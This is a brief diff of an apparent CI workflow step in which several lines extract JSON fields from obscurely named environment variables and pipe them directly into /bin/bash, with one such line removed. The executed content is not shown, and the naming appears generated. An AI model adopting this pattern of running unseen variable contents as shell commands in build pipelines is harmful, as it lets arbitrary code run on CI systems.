@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$i98" | jq -r .bgpt2470 | /bin/bash
           printf '%s' "$ufvt93296" | jq -r .se8648 | /bin/bash
-          echo $boke4737 | jq -r .og04773 | /bin/bash
           printf '%s' "$y04" | jq -r .du2 | /bin/bash
 
       - name: Store results
